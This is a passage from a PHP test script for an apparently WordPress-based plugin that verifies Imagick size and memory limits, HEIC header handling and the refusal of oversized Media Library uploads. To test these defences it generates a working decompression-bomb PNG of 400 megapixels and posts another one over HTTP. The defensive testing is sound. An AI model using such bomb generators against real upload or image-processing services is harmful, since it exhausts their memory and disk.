	$check( 'Imagick\'s width and height limits are set', ImageSize::MEDIA_MAX_SIDE === $limit( Imagick::RESOURCETYPE_WIDTH ) && ImageSize::MEDIA_MAX_SIDE === $limit( Imagick::RESOURCETYPE_HEIGHT ), $limit( Imagick::RESOURCETYPE_WIDTH ) . ' wide' );
	$check( '... and its area (the pixel cap), memory, map and disk', ImageSize::MEDIA_MAX_PIXELS === $limit( Imagick::RESOURCETYPE_AREA ) && ImageSize::IMAGICK_BYTES === $limit( Imagick::RESOURCETYPE_MEMORY ) && ImageSize::IMAGICK_BYTES === $limit( Imagick::RESOURCETYPE_MAP ) && ImageSize::IMAGICK_BYTES === $limit( Imagick::RESOURCETYPE_DISK ), 'area ' . $limit( Imagick::RESOURCETYPE_AREA ) . ', memory ' . $limit( Imagick::RESOURCETYPE_MEMORY ) . ', disk ' . $limit( Imagick::RESOURCETYPE_DISK ) );

	// A real decompression bomb: a few hundred kilobytes that decode to 400 megapixels. Only what Imagick itself refuses stops a format whose header nothing reads (HEIC, PDF).
	$zeros = static function ( int $width, int $height, int $channels ) use ( &$made, $suffix ): string {
		$chunk = static fn( string $type, string $data ): string => pack( 'N', strlen( $data ) ) . $type . $data . pack( 'N', crc32( $type . $data ) );
		$ctx   = deflate_init( ZLIB_ENCODING_DEFLATE, array( 'level' => 1 ) );
		$row   = str_repeat( "\0", $width * $channels + 1 );
		$z     = '';
		for ( $y = 0; $y < $height; $y++ ) {
			$z .= deflate_add( $ctx, $row, ZLIB_NO_FLUSH );
		}
		$z   .= deflate_add( $ctx, '', ZLIB_FINISH );
		$path = '/tmp/mody-iso-' . $suffix . '-zeros-' . $width . 'x' . $height . '.png';
		file_put_contents( $path, "\x89PNG\r\n\x1a\n" . $chunk( 'IHDR', pack( 'NNCCCCC', $width, $height, 8, 3 === $channels ? 2 : 0, 0, 0, 0 ) ) . $chunk( 'IDAT', $z ) . $chunk( 'IEND', '' ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents
		$made['files'][] = $path;
		return $path;
	};
	$read = static function ( string $path ): string {
		try {
			$image = new Imagick();
			$image->readImage( $path );
			$text = 'read ' . $image->getImageWidth() . 'x' . $image->getImageHeight();
			$image->clear();
			return $text;
		} catch ( ImagickException $e ) {
			return 'refused: ' . $e->getMessage();
		}
	};
	$started = microtime( true );
	$result  = $read( $zeros( 20000, 20000, 1 ) );
	$took    = microtime( true ) - $started;
	$check( 'Imagick itself refuses a 20000x20000 picture it was never sized by (400 MP), without spilling it to disk', str_starts_with( $result, 'refused' ) && $took < 20, sprintf( '%s (%.1fs)', substr( $result, 0, 70 ), $took ) );
	$result = $read( $zeros( 8064, 6048, 3 ) );
	$check( '... and still opens a 48 megapixel phone photo', 'read 8064x6048' === $result, $result );
	// HEIC has no cheap header: the header check leaves it alone and never loads an editor to size it.
	$heic    = '/tmp/mody-iso-' . $suffix . '-stub.heic';
	file_put_contents( $heic, "\0\0\0\x18ftypheic\0\0\0\0mif1heic" . str_repeat( "\0", 64 ) ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_system_operations_file_put_contents
	$made['files'][] = $heic;
	$editors = 0;
	$count_editors = static function ( $list ) use ( &$editors ) {
		++$editors;
		return $list;
	};
	add_filter( 'wp_image_editors', $count_editors );
	$judged = ImageLimits::too_big( $heic, 100, 1000 );
	$loaded = $editors;
	@wp_getimagesize( $heic ); // phpcs:ignore WordPress.PHP.NoSilencedErrors.Discouraged -- The control: core sizes a HEIC by loading it in an editor.
	remove_filter( 'wp_image_editors', $count_editors );
	$check( 'the header check does not size a HEIC (core would load an image editor to do it)', 'image/heic' === wp_get_image_mime( $heic ) && false === $judged && 0 === $loaded && $editors > 0, 'editors loaded by too_big: ' . $loaded . ', by core\'s own sizing: ' . ( $editors - $loaded ) );
}
if ( $on_member ) {
	// Over HTTP: the member's own upload of the 144 MP picture, to the media library.
	$bytes = (string) file_get_contents( $bomb ); // phpcs:ignore WordPress.WP.AlternativeFunctions.file_get_contents_file_get_contents
	$out   = $http(
		'POST',
		$host,
		'/wp-json/wp/v2/media',
		$cookies,
		array(
			'Content-Type'        => 'image/png',
			'Content-Disposition' => 'attachment; filename="bomb-' . $suffix . '.png"',
			'X-WP-Nonce'          => $nonce( $member, $cookies, 'wp_rest' ),
		),
		$bytes
	);
	switch_to_blog( $site );
	$leftover = (array) get_posts( array( 'post_type' => 'attachment', 'post_status' => 'any', 's' => 'bomb-' . $suffix, 'fields' => 'ids', 'numberposts' => 5 ) );
	foreach ( $leftover as $id ) {
		wp_delete_attachment( (int) $id, true );
	}
	restore_current_blog();
	$check( 'a member\'s upload of it to the Media Library is refused, and nothing is stored', $out['code'] >= 400 && ! $leftover && str_contains( $out['body'], 'too large' ), $out['code'] . ' ' . substr( wp_strip_all_tags( $out['body'] ), 0, 100 ) );
}

// 10. The wiring -----------------------------------------------------------------------------------------------

echo "\nWiring\n";
$check( 'Isolation::register() is called by the bootstrap', false !== has_action( 'admin_page_access_denied', array( Isolation::class, 'refuse_delete_site' ) ) && false !== has_action( 'load-authorize-application.php', array( Isolation::class, 'redirect_authorize_application' ) ) && false !== has_action( 'load-user-new.php', array( MemberMail::class, 'handle_invitation' ) ) && false !== has_action( 'wp_initialize_site', array( Quota::class, 'on_initialize_site' ) ) );

echo $failures ? "\n$failures check(s) failed.\n" : "\nAll checks passed.\n";
